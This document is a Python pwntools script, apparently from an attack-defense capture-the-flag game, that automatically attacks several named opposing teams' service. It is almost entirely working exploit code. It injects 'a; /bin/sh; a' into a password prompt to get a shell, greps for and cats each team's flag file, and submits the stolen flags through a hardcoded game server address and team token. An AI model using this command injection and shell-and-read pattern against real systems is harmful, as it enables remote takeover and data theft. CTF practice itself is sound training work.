#!/usr/bin/env python3
import swpag_client
from pwn import *

t = swpag_client.Team('http://34.211.129.130', 'AxuE8hQPxgquUdetEO3P')
teams = t.get_targets(1)

for team in teams:
    if (team['hostname'] == 'team13' or team['hostname'] == 'team14' or team['hostname'] == 'team15' or team['hostname'] == 'team20' or 
        team['hostname'] == 'team22'):
        try:
            r = remote(team['hostname'], 10001)
            r.recvuntil('(3) Exit.')
            r.send('2\n')
            r.recvuntil('Select a name for your backup:')
            r.send('a\n')
            r.recvuntil('Choose a secure password for your backup:') 
            # exploit = ("a; ls | grep " + team['flag_id']+ "; a \n")
            exploit = ("a; /bin/sh; a\n")
            # print(exploit)
            r.send(exploit)
            # r.recvuntil('Here is your backup data that was stored securely:') 
            print("First line: " + str(r.recv()))
            print("Second line: " + str(r.recv()))
            ls_file = str("ls | grep " + team['flag_id'] + '\n')
            r.send(ls_file)
            get_file = r.recv()
            get_file = get_file.decode()
            print("File: " + str(get_file))
            open_file = ('cat ' + str(get_file) + '\n')
            r.send(open_file)
            # r.send('cat ' + str(get_file))
            real_flag = r.recv()
            real_flag = real_flag.decode()
            print(real_flag)
            r.close()
            #submit = "\nt.submit_flag(['%s']\n" % str(real_flag)
            #r.send(submit)
            print(t.submit_flag([real_flag]))
            
        # try:
        #    r.send(exploit)
        #    r.send('ls | grep ' + team['flag_id'])
        #    get_file = r.recv()
        #    print(get_file)
        
            # r.send('cat '+ str(get_file))
            # real_flag = r.recv()
            # print(real_flag)
            # r.send('cat ')
            # r.send('ab\n')
            # print(r.recv())
        #        except:
        #            continue 
        except PwnlibException:
            continue